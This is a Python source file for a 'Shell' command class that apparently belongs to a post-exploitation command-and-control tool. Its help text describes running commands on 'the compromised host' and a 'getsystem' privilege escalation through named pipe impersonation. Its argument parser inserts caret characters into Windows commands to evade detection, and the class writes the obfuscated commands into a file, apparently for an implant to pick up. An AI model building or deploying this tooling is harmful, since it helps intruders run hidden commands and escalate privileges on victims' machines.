from command import Command
import os

class Shell(Command):
				 		  
	__dontObf = ['list','exit','getsystem','rev2self']
	__aux = ""

	def printHelp(self):

		helpstr1 = """\n Execute windows command in a new cmd process.
		"""
		helpstr2 = """\n List all the processes running in the compromised host.
	\n ** USAGE **: list 
		"""
		helpstr3 = """\n Attempt to obtain System privileges using named pipes impersonation.
	\n ** USAGE **: getsystem 
		"""
		helpstr4 = """\n Revert all impersonations and get back to the original security context.
	\n ** USAGE **: rev2self 
		"""

		if self.__aux == "list":
			print(helpstr2)
		elif self.__aux == "getsystem":
			print(helpstr3)			
		elif self.__aux == "rev2self":
			print(helpstr4)			
		else:
			print(helpstr1)
			
					
	def parseArgs(self, path, cmdSpl, ind):
		if cmdSpl[0] in self.__dontObf:
			return cmdSpl[0]

		cmd = ""
		quoted = False
		for c in cmdSpl:
			if c.startswith('"'):
				if not quoted:
					quoted = True
				elif quoted:
					quoted = False
				cmd += c
			else:
				if not quoted:
					for l in c:
						cmd += l + '^'
				else:
					cmd += c
			cmd += " "

		return cmd

	def executeCommand(self, cmdSpl, prevId, nextId, filePath):
		if len(cmdSpl) > 1 and cmdSpl[1] == 'help':
				self.__aux = cmdSpl[0]
				self.printHelp()
		else:
			command = self.parseArgs(None, cmdSpl, None)
			#os.system(command)
			self.writeCommandInFile(command, prevId, nextId, filePath)
			return True
